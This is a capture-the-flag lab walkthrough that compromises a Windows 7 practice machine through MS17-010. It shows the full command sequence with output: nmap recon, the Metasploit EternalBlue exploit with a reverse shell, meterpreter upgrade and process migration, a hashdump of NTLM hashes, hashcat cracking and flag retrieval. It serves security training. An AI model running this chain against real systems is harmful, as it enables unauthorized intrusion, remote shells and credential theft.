### Task 1 :

#### 1) Scan the machine.

`nmap -sC -sV 10.10.36.127`

> Nmap scan report for ip-10-10-36-127.eu-west-1.compute.internal (10.10.36.127)
> 
> Host is up (0.00061s latency).
> 
> Not shown: 991 closed ports
> 
> PORT      STATE SERVICE       VERSION
> 
> **135**/tcp   open  msrpc         Microsoft Windows RPC
> 
> **139**/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
> 
> **445**/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
> 
> 3389/tcp  open  ms-wbt-server Microsoft Terminal Service
> 
> | ssl-cert: Subject: commonName=Jon-PC
> 
> | Not valid before: 2022-07-31T19:36:06
> 
> |\_Not valid after:  2023-01-30T19:36:06
> 
> |\_ssl-date: 2022-08-01T19:40:04+00:00; -1s from scanner time.
> 
> 49152/tcp open  msrpc         Microsoft Windows RPC
> 
> 49153/tcp open  msrpc         Microsoft Windows RPC
> 
> 49154/tcp open  msrpc         Microsoft Windows RPC
> 
> 49158/tcp open  msrpc         Microsoft Windows RPC
> 
> 49160/tcp open  msrpc         Microsoft Windows RPC
> 
> MAC Address: 02:22:D4:19:54:9D (Unknown)
> 
> Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
> 
> 
> Host script results:
> 
> |\_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:22:d4:19:54:9d (unknown)
> 
> | smb-os-discovery: 
> 
> |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
> 
> |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
> 
> |   Computer name: Jon-PC
> 
> |   NetBIOS computer name: JON-PC\x00
> 
> |   Workgroup: WORKGROUP\x00
> 
> |_  System time: 2022-08-01T14:40:05-05:00
> 
> | smb-security-mode: 
> 
> |   account_used: guest
> 
> |   authentication_level: user
> 
> |   challenge_response: supported
> 
> |_  message_signing: disabled (dangerous, but default)
> 
> | smb2-security-mode: 
> 
> |   2.02: 
> 
> |_    Message signing enabled but not required
> 
> | smb2-time: 
> 
> |   date: 2022-08-01 20:40:05
> 
> |_  start_date: 2022-08-01 20:36:05

#### 2) How many ports are open with a port number under 1000 ?

3

#### 3) What is this machine vulnerable to ? (Answer in the form of: ms??-???, ex: ms08-067)

Google "shadowbrokers smb v1" => https://www.microsoft.com/security/blog/2017/06/16/analysis-of-the-shadow-brokers-release-and-mitigation-with-windows-10-virtualization-based-security/
=> MS17-010

  
### Task 2 :

#### 1) Start Metasploit

#### 2) Find the exploitation code we will run against the machine. What is the full path of the code ?

`msf5 > search ms17-010`

> Matching Modules
> 
> ================
> 
>    \#  Name                                      Disclosure Date  Rank     Check  Description
>   
>    -  ----                                      ---------------  ----     -----  -----------
>   
>    0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
>   
>    1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
>   
>    2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
>   
>    3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
>   
>    4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

=> exploit/windows/smb/ms17_010_eternalblue

#### 3) Show options and set the one required value. What is the name of this value ? 

`msf5 > use 2`
  
> [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

`msf5 exploit(windows/smb/ms17_010_eternalblue) > show options`

> Module options (exploit/windows/smb/ms17_010_eternalblue):
> 
>    Name           Current Setting  Required  Description
>   
>    ----           ---------------  --------  -----------
>   
>    RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
>   
>    RPORT          445              yes       The target port (TCP)
>   
>    SMBDomain      .                no        (Optional) The Windows domain to use for authentication
>   
>    SMBPass                         no        (Optional) The password for the specified username
>   
>    SMBUser                         no        (Optional) The username to authenticate as
>   
>    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
>   
>    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
> 
> Payload options (windows/x64/meterpreter/reverse_tcp):
> 
>    Name      Current Setting  Required  Description
>   
>    ----      ---------------  --------  -----------
>   
>    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
>   
>    LHOST     10.10.220.78     yes       The listen address (an interface may be specified)
>   
>    LPORT     4444             yes       The listen port
> 
> Exploit target:
> 
>    Id  Name
> 
>   --  ----
> 
>   0   Windows 7 and Server 2008 R2 (x64) All Service Packs  
  
=> RHOSTS

`msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.36.127`

> RHOSTS => 10.10.36.127

`msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp`
  
> payload => windows/x64/shell/reverse_tcp
  
`msf5 exploit(windows/smb/ms17_010_eternalblue) > run`

> [\*] Started reverse TCP handler on 10.10.220.78:4444 
>   
> [\*] 10.10.36.127:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
>   
> [+] 10.10.36.127:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
>   
> [*] 10.10.36.127:445      - Scanned 1 of 1 hosts (100% complete)
>   
> [*] 10.10.36.127:445 - Connecting to target for exploitation.
>   
> [+] 10.10.36.127:445 - Connection established for exploitation.
>   
> [+] 10.10.36.127:445 - Target OS selected valid for OS indicated by SMB reply
>   
> [*] 10.10.36.127:445 - CORE raw buffer dump (42 bytes)
>   
> [*] 10.10.36.127:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
>   
> [*] 10.10.36.127:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
>   
> [*] 10.10.36.127:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
>   
> [+] 10.10.36.127:445 - Target arch selected valid for arch indicated by DCE/RPC reply
>   
> [*] 10.10.36.127:445 - Trying exploit with 12 Groom Allocations.
>   
> [*] 10.10.36.127:445 - Sending all but last fragment of exploit packet
>   
> [*] 10.10.36.127:445 - Starting non-paged pool grooming
>   
> [+] 10.10.36.127:445 - Sending SMBv2 buffers
>   
> [+] 10.10.36.127:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
>   
> [*] 10.10.36.127:445 - Sending final SMBv2 buffers.
>   
> [*] 10.10.36.127:445 - Sending last fragment of exploit packet!
>   
> [*] 10.10.36.127:445 - Receiving response from exploit packet
>   
> [+] 10.10.36.127:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
>   
> [*] 10.10.36.127:445 - Sending egg to corrupted connection.
>   
> [*] 10.10.36.127:445 - Triggering free of corrupted buffer.
>   
> [*] Sending stage (336 bytes) to 10.10.36.127
>   
> [*] Command shell session 1 opened (10.10.220.78:4444 -> 10.10.36.127:49202) at 2022-08-01 21:02:13 +0100
>   
> [+] 10.10.36.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
>   
> [+] 10.10.36.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
>   
> [+] 10.10.36.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

  
### Task 3 :

#### 1) If you haven't already, background the previously gained shell `CTRL + Z`. Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use ?

`msf5 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter`

> Matching Modules
> 
>    \#  Name                                    Disclosure Date  Rank    Check  Description
> 
>   -  ----                                    ---------------  ----    -----  -----------
>   
>    0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
  
=> post/multi/manage/shell_to_meterpreter  

#### 2) Select this (use MODULE_PATH). Show options, what option are we required to change ?

`msf5 exploit(windows/smb/ms17_010_eternalblue) > use 0`
  
`msf5 post(multi/manage/shell_to_meterpreter) > show options`

> Module options (post/multi/manage/shell_to_meterpreter):
> 
>    Name     Current Setting  Required  Description
>   
>    ----     ---------------  --------  -----------
>   
>    HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
>   
>    LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
>   
>    LPORT    4433             yes       Port for payload to connect to.
>   
>    SESSION                   yes       The session to run this module on.

=> SESSION

#### 3) Set the required option, you may need to list all of the sessions to find your target here.

`sessions -l`
  
`set SESSION 1`

#### 4) Run! If this doesn't work, try completing the exploit from the previous task once more.

`msf5 post(multi/manage/shell_to_meterpreter) > run`

> [*] Upgrading session ID: 1
> 
> [*] Starting exploit/multi/handler
> 
> [*] Started reverse TCP handler on 10.10.220.78:4433 
> 
> [*] Post module execution completed
> 
> msf5 post(multi/manage/shell_to_meterpreter) > 
> 
> [*] Sending stage (176195 bytes) to 10.10.36.127
> 
> [*] Meterpreter session 2 opened (10.10.220.78:4433 -> 10.10.36.127:49209) at 2022-08-01 21:08:24 +0100
> 
> [*] Stopping exploit/multi/handler

#### 5) Once the meterpreter shell conversion completes, select that session for use.

`sessions -l`

> Active sessions
>   
> ===============
> 
>   Id  Name  Type                     Information                                                                       Connection
>   
> --  ----  ----                     -----------                                                                       ----------
>   
> 1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.10.220.78:4444 -> 10.10.36.127:49202 (10.10.36.127)
>   
> 2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.10.220.78:4433 -> 10.10.36.127:49209 (10.10.36.127)

`mmsf5 post(multi/manage/shell_to_meterpreter) > sessions 2`

> [*] Starting interaction with 2...

#### 6) Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'.

`meterpreter > getsystem`

> ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
  
`meterpreter > shell`
  
> Process 2368 created.
>   
> Channel 1 created.
>   
> Microsoft Windows [Version 6.1.7601]
> 
> Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

`C:\Windows\system32>whoami`

> nt authority\system

#### 7) List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

`C:\Windows\system32>^Z`

`Background channel 1? [y/N]  y`

`meterpreter > ps`

> Process List
>   
> ============
> 
>  PID   PPID  Name                  Arch  Session  User                          Path
>   
> ---   ----  ----                  ----  -------  ----                          ----
> 
> 0     0     [System Process]                                                   
> 
> 4     0     System                x64   0                                      
> 
> 140   564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
> 
> 356   708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
> 
> 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
> 
> 432   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
> 
> 484   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
> 
> 564   552   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
> 
> 612   552   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
> 
> 620   604   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
> 
> 660   604   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
> 
> 708   612   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
> 
> 716   612   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
> 
> 724   612   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
> 
> 832   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
> 
> 900   708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
> 
> 948   708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
> 
> 1016  660   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
> 
> 1080  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
> 
> 1180  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
> 
> 1308  708   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
> 
> 1344  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
> 
> 1388  832   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
> 
> 1412  708   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
> 
> 1468  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
> 
> 1484  708   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
> 
> 1624  708   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
> 
> 1688  1308  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
> 
> 1784  832   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
> 
> 1964  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
> 
> 2208  1848  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
> 
> 2272  708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
> 
> 2368  2880  cmd.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\cmd.exe
> 
> 2516  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
> 
> 2524  708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
> 
> 2584  708   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
> 
> 2624  708   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
> 
> 2752  708   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
> 
> 2880  2208  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
> 
> 3068  708   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe

=> 2880  2208  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe

#### 8) Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step.

`meterpreter > migrate 2208`

> [*] Migration completed successfully.

  
### Task 4 :

#### 1) Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user ?

`meterpreter > hashdump`

> Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
>   
> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
>   
> Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

=> Jon

#### 2) Copy this password hash to a file and research how to crack it. What is the cracked password ?

`echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > Jon.hash`

`hashcat -m 1000 -a 0 Jon.hash /usr/share/wordlists/rockyou.txt`

> ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22        
> 
> Session..........: hashcat
> 
> Status...........: Cracked
> 
> Hash.Name........: NTLM
> 
> Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
> 
> Time.Started.....: Mon Aug  1 21:27:06 2022 (3 secs)
> 
> Time.Estimated...: Mon Aug  1 21:27:09 2022 (0 secs)
> 
> Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
> 
> Guess.Queue......: 1/1 (100.00%)
> 
> Speed.#1.........:  3879.1 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
> 
> Recovered........: 1/1 (100.00%) Digests
> 
> Progress.........: 10201088/14344384 (71.12%)
> 
> Rejected.........: 0/10201088 (0.00%)
> 
> Restore.Point....: 10199040/14344384 (71.10%)
> 
> Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
> 
> Candidates.#1....: alsina521 -> alphasanag

=> alqfna22


### Task 5 :

#### 1) This flag can be found at the system root.

`meterpreter > shell`

`dir C:\` => C:\flag1.txt

`C:\Windows\system32>type C:\flag1.txt`

=> flag{access_the_machine}

#### 2) This flag can be found at the location where passwords are stored within Windows.

`cd C:\windows\system32\config`
  
`dir flag*`

`type flag2.txt`

=> flag {sam_database_elevated_access}

Note : Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 

#### 3) This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.
  
`cd ..\..`

`dir c:\`

`cd c:\Users`

`dir`

`cd Jon`

`dir`

`dir flag* /s /p`

`type C:\Users\Jon\Documents\flag3.txt`

=> flag{admin_documents_can_be_valuable}
